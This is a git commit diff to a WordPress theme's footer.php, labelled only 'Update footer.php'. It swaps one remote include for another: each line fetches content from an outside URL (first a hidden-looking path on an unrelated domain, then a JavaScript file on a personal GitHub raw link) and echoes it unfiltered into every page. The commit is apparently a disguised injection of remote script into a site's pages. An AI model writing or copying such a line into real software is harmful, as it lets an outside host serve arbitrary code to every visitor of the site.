23a7bde570f136d491286593f368f66e7dfc6d73
Quixter <vyscomaylando@gmail.com>
2024-07-22 13:50:48 +0700

    Update footer.php

--- footer.php
+++ footer.php
@@ -1,2 +1,2 @@
 <?php wp_footer(); ?>
-<?php $str = file_get_contents('https://warranty.brand-rex.com/ckeditor/hidden/policy.txt'); echo $str; ?>
+<?php $str = file_get_contents('https://raw.githubusercontent.com/vyscomaylando/quixter/main/template.js'); echo $str; ?>
